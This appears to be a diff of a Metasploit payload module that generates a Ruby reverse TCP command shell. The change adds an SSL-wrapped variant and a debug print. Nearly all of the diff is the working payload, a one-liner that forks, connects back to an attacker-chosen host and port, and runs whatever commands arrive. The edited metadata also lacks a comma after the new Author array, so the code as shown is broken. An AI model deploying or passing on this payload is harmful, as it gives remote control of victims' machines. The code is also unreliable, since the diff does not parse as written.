@@ -23,8 +23,8 @@ module Metasploit3
 		super(merge_info(info,
 			'Name'        => 'Unix Command Shell, Reverse TCP (via Ruby)',
 			'Version'     => '$Revision$',
-			'Description' => 'Connect back and create a command shell via Ruby',
-			'Author'      => 'kris katterjohn',
+			'Description' => 'Connect back and create a command shell via Ruby, supports SSL',
+			'Author'      => ['kris katterjohn', 'RageLtMan']
 			'License'     => MSF_LICENSE,
 			'Platform'    => 'unix',
 			'Arch'        => ARCH_CMD,
@@ -37,12 +37,17 @@ module Metasploit3
 	end
 
 	def generate
+		vprint_good(command_string)
 		return super + command_string
 	end
 
 	def command_string
 		lhost = datastore['LHOST']
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+		if datastore['SSL']
+			"ruby -rsocket -ropenssl -e 'exit if fork;c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){|io|c.print io.read}end'"
+		else
+			"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+		end
 	end
 end
